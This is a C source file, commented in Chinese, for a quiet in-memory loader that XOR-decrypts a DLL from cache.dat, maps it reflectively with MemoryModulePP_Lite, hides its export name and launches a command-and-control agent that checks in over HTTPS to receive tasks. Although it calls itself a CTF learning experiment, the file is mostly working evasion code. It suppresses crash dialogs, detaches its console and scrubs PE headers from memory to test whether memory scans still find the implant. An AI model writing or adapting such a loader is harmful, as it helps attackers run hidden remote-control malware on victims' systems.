#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include "MemoryModulePP_Lite.h"

/*
 * 文件作用：用 MemoryModulePP_Lite 路径加载 direct_https DLL 的 quiet loader。
 *
 * 小白版流程：
 * 1. PowerShell 启动这个 exe；
 * 2. exe 读取 cache.dat；
 * 3. 用固定 key 把 cache.dat XOR 还原成 DLL 字节；
 * 4. 用 MmpLiteLoadLibraryFromMemory() 把 DLL 映射进当前进程内存；
 * 5. 从 DLL 导出表找到 RunAgentDll；
 * 6. 调用 RunAgentDll，让 direct_https 学习版 agent 开始 check-in。
 *
 * 和旧版 loader_agentdll_quiet.c 的关键区别：这里不调用经典 MemoryModule.h，
 * 而是走本目录新增的 MemoryModulePP_Lite API，便于单独验证“换 loader 核心”对上线/存活的影响。
 */

typedef DWORD (WINAPI *RunAgentDllFn)(void);

#ifndef MMPP_XOR_KEY
#define MMPP_XOR_KEY "ctf-memory-loader-key-20260624"
#endif

#ifndef MMPP_HEADER_SCRUB_MODE
#define MMPP_HEADER_SCRUB_MODE 0
#endif

static const char* g_log_path = NULL;

/*
 * diag_log 是本实验最重要的“黑盒变白盒”辅助函数。
 *
 * 内存加载失败时，Windows 上通常只看到进程闪退或没有 callback，
 * 很难知道到底卡在“读文件、解密、PE 映射、导入表、DllMain、RunAgentDll”
 * 哪一步。因此 loader 支持把每个关键阶段写入 mmpp-loader-status.txt。
 *
 * 注意：这里刻意只用 WinAPI，不用 printf/stdout。因为这个 loader 是 GUI
 * 子系统程序，没有稳定控制台；同时 Start-Process/WMI/计划任务启动时 stdout
 * 也不一定能被收集。
 */
static void diag_log(const char* text)
{
    HANDLE h;
    DWORD written = 0;
    if (!g_log_path || !text) return;
    h = CreateFileA(g_log_path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    WriteFile(h, text, (DWORD)strlen(text), &written, NULL);
    WriteFile(h, "\r\n", 2, &written, NULL);
    CloseHandle(h);
}

/* 写入 “KEY=数字” 格式的诊断行，例如 READ_FILE_OK_SIZE=63488。 */
static void diag_log_num(const char* key, DWORD value)
{
    char buf[96];
    wsprintfA(buf, "%s=%lu", key ? key : "value", (unsigned long)value);
    diag_log(buf);
}

/*
 * 轻量堆分配封装。
 *
 * 这里不用 malloc/free，是为了尽量减少 CRT 依赖，让 loader 行为更接近
 * “小加载器”。真正的 direct_https DLL 内部仍然可以使用自己的 CRT/封装。
 */
static void* heap_alloc(SIZE_T size)
{
    return HeapAlloc(GetProcessHeap(), 0, size);
}

static void heap_free(void* ptr)
{
    if (ptr) HeapFree(GetProcessHeap(), 0, ptr);
}

/* 读取 cache.dat 的完整内容到内存。返回 0 表示成功，非 0 表示具体错误阶段。 */
static int read_file_winapi(const char* path, unsigned char** outBuf, DWORD* outSize)
{
    HANDLE h;
    LARGE_INTEGER li;
    DWORD total = 0;
    unsigned char* buf;

    if (!path || !outBuf || !outSize) return 1;
    *outBuf = NULL;
    *outSize = 0;

    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 2;
    /*
     * 限制 payload 最大 128MB，避免路径传错时把异常大文件读进内存。
     * 本实验 direct_https DLL bin 当前约几十 KB。
     */
    if (!GetFileSizeEx(h, &li) || li.QuadPart <= 0 || li.QuadPart > 128 * 1024 * 1024) {
        CloseHandle(h);
        return 3;
    }
    buf = (unsigned char*)heap_alloc((SIZE_T)li.QuadPart);
    if (!buf) {
        CloseHandle(h);
        return 4;
    }
    while (total < (DWORD)li.QuadPart) {
        DWORD got = 0;
        DWORD want = (DWORD)li.QuadPart - total;
        if (!ReadFile(h, buf + total, want, &got, NULL) || got == 0) {
            heap_free(buf);
            CloseHandle(h);
            return 5;
        }
        total += got;
    }
    CloseHandle(h);
    *outBuf = buf;
    *outSize = total;
    return 0;
}

/*
 * XOR 加/解密。
 *
 * pack_xor.py 用同一个 key 对 DLL 做 XOR 得到 cache.dat；
 * loader 再用同一个 key XOR 一次，就还原出原始 DLL 字节。
 *
 * 这不是强加密，只是学习实验里用来证明“磁盘上不直接放 DLL 明文”的
 * 最小封装。后续若做更严肃的工程，应替换成更规范的封装与密钥管理。
 */
static void xor_crypt(unsigned char* buf, DWORD size, const char* key)
{
    DWORD keyLen = key ? (DWORD)strlen(key) : 0;
    DWORD i;
    if (!buf || !size || !keyLen) return;
    for (i = 0; i < size; i++) buf[i] ^= (unsigned char)key[i % keyLen];
}

/*
 * 解出导出函数名 RunAgentDll。
 *
 * 这里没有直接写明文字符串 "RunAgentDll"，而是用简单 XOR 存放。
 * 这只是为了让 loader 字符串更少、更像小型实验 loader；不是安全边界。
 */
static void decode_export_name(char* out, DWORD outSize)
{
    static const unsigned char enc[] = {
        0x08, 0x2f, 0x34, 0x1b, 0x3d, 0x3f, 0x34, 0x2e, 0x1e, 0x36, 0x36, 0x00
    };
    DWORD i;
    if (!out || outSize < sizeof(enc)) return;
    for (i = 0; i < sizeof(enc) - 1; i++) out[i] = (char)(enc[i] ^ 0x5a);
    out[sizeof(enc) - 1] = 0;
}

/*
 * run_loader 是整个 loader 的主流程：
 *
 * 1. 设置进程错误模式，减少崩溃弹窗；
 * 2. 读取 cache.dat；
 * 3. XOR 解密，还原 DLL；
 * 4. 检查 MZ 魔数，确认解密结果像 PE；
 * 5. 调 MmpLiteLoadLibraryFromMemory 手动映射 DLL；
 * 6. 从导出表找 RunAgentDll；
 * 7. 调 RunAgentDll，进入 direct_https AgentMain；
 * 8. AgentMain 会进入长期循环，所以正常情况下 runAgent() 很久不会返回。
 */
static int run_loader(const char* binPath, const char* key)
{
    unsigned char* payload = NULL;
    DWORD payloadSize = 0;
    HMEMORYMODULEPP_LITE module = NULL;
    RunAgentDllFn runAgent = NULL;
    FARPROC runAgentRaw = NULL;
    char exportName[16] = {0};
    DWORD rc;

    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
    FreeConsole();
    if (g_log_path && g_log_path[0]) SetEnvironmentVariableA("MMPP_LOADER_LOG", g_log_path);
    diag_log("STAGE=start");

    rc = (DWORD)read_file_winapi(binPath, &payload, &payloadSize);
    if (rc != 0) {
        diag_log_num("READ_FILE_ERROR", rc);
        return 10 + (int)rc;
    }
    diag_log_num("READ_FILE_OK_SIZE", payloadSize);
    xor_crypt(payload, payloadSize, key);
    /*
     * MZ 是 Windows PE 文件开头的两个字节。
     * 如果这里不是 MZ，通常说明 key 不对、文件没下载完整，或者传错了文件。
     */
    if (payloadSize < 2 || payload[0] != 'M' || payload[1] != 'Z') {
        diag_log("DECRYPT_MAGIC_ERROR");
        heap_free(payload);
        return 20;
    }
    diag_log("DECRYPT_MAGIC_OK");

    /*
     * 真正的“内存加载”发生在这里。
     * 此函数内部会模拟 Windows loader：分配映像内存、复制 section、修复
     * relocation/import/TLS/exception table，并调用 DllMain。
     */
    module = MmpLiteLoadLibraryFromMemory(payload, payloadSize);
    if (!module) {
        diag_log("MMP_LOAD_ERROR");
        diag_log(MmpLiteLastErrorString());
        heap_free(payload);
        return 30;
    }
    diag_log("MMP_LOAD_OK");

    /* DLL 已经在内存里“装好”了，下面从它的导出表找 RunAgentDll。 */
    decode_export_name(exportName, sizeof(exportName));
    runAgentRaw = MmpLiteGetProcAddress(module, exportName);
    /*
     * FARPROC 是 Windows 通用函数指针类型；RunAgentDllFn 是我们知道的真实签名。
     * 这里先用 FARPROC 接住，再转成真实签名，便于后面按 DWORD WINAPI(void) 调用。
     */
    runAgent = (RunAgentDllFn)(void*)runAgentRaw;
    if (!runAgent) {
        diag_log("GETPROC_ERROR");
        diag_log(MmpLiteLastErrorString());
        MmpLiteFreeLibrary(module);
        heap_free(payload);
        return 40;
    }
    diag_log("GETPROC_OK");

    /*
     * PE header 处理实验点：
     * - DLL 已完成 MMPP_LOAD_OK；
     * - RunAgentDll 地址已经通过 export table 找到；
     * - 从这里开始再改 header，观察 agent 是否仍能上线/执行命令，以及内存扫描是否还能看到 MZ/PE。
     */
    diag_log_num("HEADER_SCRUB_MODE", (DWORD)MMPP_HEADER_SCRUB_MODE);
    if (!MmpLiteScrubPeHeaders(module, MMPP_HEADER_SCRUB_MODE)) {
        diag_log("HEADER_SCRUB_ERROR");
        diag_log(MmpLiteLastErrorString());
        MmpLiteFreeLibrary(module);
        heap_free(payload);
        return 45;
    }
    diag_log("HEADER_SCRUB_OK");

    /*
     * 这里开始进入 direct_https agent 代码。
     * RunAgentDll -> AgentMain(NULL) -> ApiLoad/Profile/Connector/Commander 初始化
     * -> direct_https check-in -> 接收 C2 任务。
     */
    diag_log("RUN_AGENT_BEGIN");
    rc = runAgent();
    diag_log_num("RUN_AGENT_RC", rc);
    MmpLiteFreeLibrary(module);
    heap_free(payload);
    return (int)rc;
}

/*
 * main 支持三种参数：
 *
 * argv[1]：payload 路径，默认 cache.dat；
 * argv[2]：XOR key，默认 MMPP_XOR_KEY；
 * argv[3]：诊断日志路径，通常是 mmpp-loader-status.txt。
 *
 * 运行脚本会把 updater.exe、cache.dat、日志路径都放在同一个 Windows 测试目录下。
 */
int main(int argc, char** argv)
{
    const char* binPath = argc > 1 ? argv[1] : "cache.dat";
    const char* key = argc > 2 ? argv[2] : MMPP_XOR_KEY;
    g_log_path = argc > 3 ? argv[3] : NULL;
    if (!g_log_path || !g_log_path[0]) g_log_path = getenv("MMPP_LOADER_LOG");
    return run_loader(binPath, key);
}
